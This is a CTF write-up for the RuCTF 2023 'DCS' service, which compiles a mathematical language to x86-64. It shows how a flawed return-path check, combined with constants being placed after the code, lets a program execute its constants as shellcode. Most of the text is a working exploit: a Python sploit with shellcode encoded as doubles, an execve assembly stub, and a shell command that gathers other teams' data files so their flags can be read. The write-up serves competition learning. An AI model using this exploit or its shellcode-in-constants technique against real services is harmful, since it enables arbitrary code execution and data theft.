# RuCTF Finals 2023 | DCS

## Description

The service was named after Boris Pavlovich Demidovich - great Soviet\Belorussian mathematician.
It provides a service to the language for mathematical calculations. Documentation for the language can be found [here](/services/dcs/front/doc.md).

## Execution flow

Code of DCS program [translated](/internal/dcs/back/lang/src/compiler/compiler.cpp) into machine x86_64 instructions and run with executor in service [runtime](/internal/dcs/back/server/src/playground/executor.cpp).

For example. This code:
```
fun main() {
    pi = 3.1415927;
    e = 2.7;
    k = 1337;
    return pi * e / k;
}
```

Will compile into:
```
.section .text
.globl main

main:
    push    %rbp
    mov     %rsp,%rbp
    sub     $0x18,%rsp
    movsd   _c_const_main_0(%rip),%xmm0
    movsd   %xmm0,-0x8(%rbp)
    movsd   _c_const_main_1(%rip),%xmm0
    movsd   %xmm0,-0x10(%rbp)
    movsd   _c_const_main_2(%rip),%xmm0
    movsd   %xmm0,-0x18(%rbp)
    movsd   -0x8(%rbp),%xmm0
    sub     $0x10,%rsp
    movsd   %xmm0,(%rsp)
    movsd   -0x10(%rbp),%xmm0
    movaps  %xmm0,%xmm1
    movsd   (%rsp),%xmm0
    add     $0x10,%rsp
    mulsd   %xmm1,%xmm0
    sub     $0x10,%rsp
    movsd   %xmm0,(%rsp)
    movsd   -0x18(%rbp),%xmm0
    movaps  %xmm0,%xmm1
    movsd   (%rsp),%xmm0
    add     $0x10,%rsp
    divsd   %xmm1,%xmm0
    leaveq
    retq


_c_const_main_2: .quad 0x4094e40000000000
_c_const_main_1: .quad 0x400599999999999a
_c_const_main_0: .quad 0x400921fb5a7ed197
.sign_bit: .quad 0x8000000000000000
```

### Note 1
Constants compiled after code in order of `std::unordered_map`:
```cpp
std::unordered_map<std::string, std::shared_ptr<ConstantCompilationContext>> constantNameToContext;
...
for (const auto &it : constantNameToContext) {
    union {
        double v;
        uint64_t i;
    } k{};
    k.v = it.second->definitionNode->Value->Value;
    result << it.first << ": .quad " << "0x" << std::hex << k.i << std::endl;
}
```

Ex. This code
```
pi = 3.1415927;
x2 = -234234.123123;
e = 2.7;
x1 = 1.23123123;

fun main() { return 0; }
```
Will compile into:
```asm
.section .text
.globl main

main:
    push    %rbp
    mov     %rsp,%rbp
    movsd   _c_const_main_0(%rip),%xmm0
    leaveq
    retq


x1: .quad 0x3ff3b31f84aa9f25
e: .quad 0x400599999999999a
x2: .quad 0xc10c97d0fc27e953
_c_const_main_0: .quad 0x0
pi: .quad 0x400921fb5a7ed197
.sign_bit: .quad 0x8000000000000000
```
That means: *if execution flow of the function will not return, constant values will be executed*.

### Note 2
Checking for return in every code path contains an error:
```cpp
bool CompilerWithContext::allCodePathsHasReturn(const std::shared_ptr<FunctionDefinitionNode> &function) {
    for (const auto &st : function->Body->Statements) {
        if (statementHasReturn(st)) {
            return true;
        }
    }

    return false;
}
```
That leads to this code:
```
fun main() {
    if (1 < 2) {
        return 3.14;
    }
}
```

Compiled into:
```
.section .text
.globl main

main:
    push    %rbp
    mov     %rsp,%rbp
    movsd   _c_const_main_0(%rip),%xmm0
    sub     $0x10,%rsp
    movsd   %xmm0,(%rsp)
    movsd   _c_const_main_1(%rip),%xmm0
    movaps  %xmm0,%xmm1
    movsd   (%rsp),%xmm0
    add     $0x10,%rsp
    comisd  %xmm1,%xmm0
    jae ._0
    movsd   _c_const_main_2(%rip),%xmm0
    leaveq
    retq
._0:


_c_const_main_2: .quad 0x40091eb851eb851f
_c_const_main_1: .quad 0x4000000000000000
_c_const_main_0: .quad 0x3ff0000000000000
.sign_bit: .quad 0x8000000000000000
)
```

Mixing this two notes, we can create program, that executes its own constants:
```
constant1..N = shellcode here;

fun main() {
    if (1 > 2) {
        return 3;
    }
}
```

### Note 3

You cant just execute `/bin/sh` - there is terminal for it inside program execution.
But you can store all stealed flag in storage by specified token with shell, ex:
```bash
mkdir -p /var/dcs/data/ru && rm -f /var/dcs/data/ru/ctfructfructfructfructfructfru && find /var/dcs/data -type f > /var/dcs/data/ru/ctfructfructfructfructfructfru && printf '\\00\\303' >> /var/dcs/data/ru/ctfructfructfructfructfructfru
```
Note, that you need to append 0, ret, into generated file to `GET /api/compute` works correctly.

### Note 4
This is how you can convert bytes of shell into double value:
```cpp
#include <iostream>
#include <iomanip>
#include <cstring>

int main() {
	union {
		char bytes[sizeof(double)];
		double v;
	};
	std::strncpy(bytes, "/bin//sh", sizeof(double));
	std::cout << std::setprecision(30) << v << std::endl;
    return 0;
}
```

### Result

Combining it all together, we got [next sploit](/sploits/dcs/dcs.1.sploit.py):

```python
#!/usr/bin/env python3

import hashlib
import sys

import api

code = '''
_0000 = 4.45822432662471531958872096101e+252;
_0001 = 1.19782304862903820345902151854e+243;
_0002 = 1.91433085964668933099730042059e+261;
_0003 = 3.98455339352822777031486764751e+252;
_0004 = 9.73522563016263357401293305748e-315;
_0005 = 3.88936149933469592127393174833e+174;
_0006 = 3.88936149933469592127393174833e+174;
_0007 = 4.45822432662471531958872096101e+252;
_0008 = 5.93621147035131015845707833809e+169;
_0009 = 5.52559648449915692702815701664e+257;
_000a = 6.32280097505374462953932699201e+233;
_000b = 8.25971437587339054081582628633e-154;
_000c = 9.31476625662437923964372193661e+242;
_000d = 5.93621147035131015845707833809e+169;
_000e = 6.53747834600816911773243398146e-125;
_000f = 6.53747834600816911773243398146e-125;
_0010 = 3.9381538893456823461224877281e-62;
_0011 = 3.11888404251331059194979670708e+161;
_0012 = 5.52559648449915692702815701664e+257;
_0013 = 3.4653160729132520229722030536e+185;
_0014 = 1.29503525642399536129001394637e+171;
_0015 = 1.9143324972053054017456038103e+261;
_0016 = 5.52559648449915692702815701664e+257;
_0017 = 1.33980497747332409769287086757e-152;
_0018 = 3.88936149933469592127393174833e+174;
_0019 = 4.39558737237486546973012633094e+252;
_001a = 1.91429491296407703192166757816e+261;
_001b = -6.82761769577296130672065869357e-229;
_001c = 1.19782304862903820345902151854e+243;
_001d = 1.35452787268204745946619571028e+243;
_001e = -3605727437012366848;
_001f = -11920.0000000052332325140014291;
_0020 = -1.13962551584212620632980908507e-244;
_0021 = 1.41894014867253636496431508459e+161;
_0022 = 3.08856759534166243916303683284e-308;
_0023 = 6.17713519068332487832607366568e-308;
_0024 = 1.08805855771401084070533089734e-306;
_0025 = 9.5729280743176072948036481258e-308;

fun main() {
    if (_001a < _0025) {
        return _0023;
    }
}
'''

PORT = 7654
HOSTNAME = sys.argv[1]
FLAG_ID = sys.argv[2]


def sha256(s: str) -> str:
    return hashlib.sha256(s.encode('utf-8')).hexdigest()


if __name__ == '__main__':
    with api.DCSClient(HOSTNAME, PORT) as c:
        r = c.create(code, 'PWNED')
        assert(r.error == '')

        r = c.get()
        assert(r.error == '')

        r = c.get('ructfructfructfructfructfructfru')
        assert(r.error == '')

        paths = r.description
        def get_token_from_path(p):
            l = p.split('/')
            if len(l) < 2:
                return ''
            return l[-2] + l[-1]
        victim_tokens = list(map(get_token_from_path, paths.split('\n')))

        for t in victim_tokens:
            if sha256(t) == FLAG_ID:
                r = c.get(t)
                assert(r.error == '')
                print(r.description)
```

[sploit asm code](/sploits/dcs/shell.S) just run `execve` with bash script from above:
```
.section .text
.globl _start

_start:
    xor     %rdx, %rdx
    leaq    arg2(%rip), %rsi
    pushq   %rsi
    leaq    arg1(%rip), %rsi
    pushq   %rsi
    leaq    cmd(%rip), %rsi
    pushq   %rsi
    movq    %rsp, %rsi
    leaq    cmd(%rip), %rdi
    movq    $59, %rax
    syscall
    ret

cmd:
    .asciz "/bin/sh"
arg1:
    .asciz "-c"
arg2:
    .asciz "mkdir -p dataexample/ru && rm -f dataexample/ru/ctfructfructfructfructfructfru && find dataexample -type f > dataexample/ru/ctfructfructfructfructfructfru && printf '\\00\\303' >> dataexample/ru/ctfructfructfructfructfructfru"
null:
    .quad 0
```
